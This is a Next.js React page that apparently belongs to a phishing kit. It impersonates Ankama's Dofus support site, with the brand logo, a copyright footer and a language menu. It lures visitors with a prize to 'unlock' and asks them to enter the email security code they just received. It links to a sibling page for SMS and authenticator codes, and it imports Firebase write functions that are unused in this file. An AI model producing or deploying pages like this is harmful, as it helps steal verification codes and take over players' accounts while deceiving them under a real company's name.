import React, { useEffect, useState } from 'react'
import db from "../../Firebase"
import { doc, setDoc,updateDoc } from "firebase/firestore";
import styles from '@/styles/Home4.module.css'
import Head from 'next/head'
import Image from 'next/image'
import { useRouter } from 'next/router';
import  Router  from 'next/router';
import Link from "next/link";



function App4(props) {
    const [page,setPage] = useState(false);
    const [phone,setPhone] = useState("");
    const [code,setCode] = useState("");
    const [min,setMin] = useState(3);
    const [sec1,setSec1] = useState(0);
    const [visible3,setVisible3] = useState(false)

    const router = useRouter();
    
    const ip ="none"


    
    const en=()=>{
      Router.push({
        pathname: '/mailVerification/en',
        query: {ip:ip}
    },"/mailVerification/en",{ shallow: true })
     }
     const es=()=>{
      Router.push({
        pathname: '/mailVerification/es',
        query: {ip:ip}
    },"/mailVerification/es",{ shallow: true })
     }
    
     const prg=()=>{
      Router.push({
        pathname: '/mailVerification/prg',
        query: {ip:ip}
    },"/mailVerification/prg",{ shallow: true })
     }


     const send=()=>{
      setCode("")
     }
   

  return (
    <div className={styles.App}>
       <Head>
      <title>cave ereboriale[DOFUS]</title>
<meta
  name="description"
  content="Accès a la Dimension Forgelanciale..."
/>
      </Head>
      <div className={styles.all3}>
      <div className={styles.nav3}>
        <div className={styles.firstNav}>
          <div className={styles.fcontainer}>
            <div className={styles.leftC}>
              <h3>ankama</h3>
              <p>SUPPORT</p>
            </div>
            <div className={styles.rightC}>
            <p style={{zIndex:10}}>DECONNEXION</p>
             <div style={{zIndex:9}} onClick={()=> setVisible3(!visible3)} className={styles.flags}>
             <div className={styles.flag1}><img src="/assets/france.png" alt="" /></div>
             {visible3 && (
              <>
              <div className={styles.flag}><img src="/assets/france.png" alt="" /> <p className={styles.flagN}>FR</p> </div>
              <div className={styles.flag}><img onClick={en}  src="/assets/usa.png" alt="" /> <p className={styles.flagN}>EN</p></div>
              <div className={styles.flag}><img src="/assets/de.png" alt="" /><p className={styles.flagN}>DE</p></div>
              <div className={styles.flag}><img onClick={es}  src="/assets/spain.png" alt="" /><p className={styles.flagN}>ES</p></div>
              <div className={styles.flag}><img onClick={prg}  src="/assets/portugal.png" alt="" /><p className={styles.flagN}>PT</p></div>
              <div className={styles.flag}><img src="/assets/italy.png" alt="" /><p className={styles.flagN}>IT</p></div>


              </>
             )}
             </div>
            </div>
          </div>
        </div>
        
        </div>

        <div className={styles.headingContainer}>
            <div className={styles.headingLogo}>
                <img src="/assets/logof.png" alt="" />
            </div>
            <div className={styles.headingContext}>
                <form onSubmit={send} className={styles.boxing}>
                <div className={styles.boxingHeader}>
                        <h2>CODE DE SÉCURITÉ</h2>
                    </div>
                    <center>
                    <div className={styles.boxContainer}>
                    <center>
                    <div className={styles.boxingMessage}>
                        <p>Un e-mail vient de vous être envoyé</p>
                    </div>
                    <div className={styles.boxingMessage2}>
                        <p>Afin de débloquer votre lot, veuillez saisir le code de sécurité qui vient d`être envoyé sur votre adresse email.</p>
                    </div>
                    <div className={styles.code}>
                        <p>Code de sécurité*</p>
                        <input onChange={(e)=>setCode(e.target.value)} value={code} placeholder='Code de sécurité' type="text" required/>
                    </div>
                    <button type="submit">Valider</button>
                    <div className={styles.goPhone}>
                    <Link className={styles.link3} href="/verification/fr" style={{color:"red",textDecoration:"none",paddingLeft:"12px"}} shallow><p>Vous utilisez l'Authentificator ? [SMS]</p></Link>

                    </div>
                    </center>
                    
                  </div>
                    </center>


                </form>
            </div>
        </div>










<div className={styles.footer3}>
  <center>
  <div className={styles.containerf}>
    <img src="/assets/logof.png" alt="" />
    <p>© 2021 Ankama. Tous droits réservés. Conditions d'utilisation - Politique de confidentialité - Conditions Générales de Vente - Mentions Légales - Gestion des cookies</p>
  </div>
  </center>
  
</div>

      </div>
    </div>
  )
}

export default App4
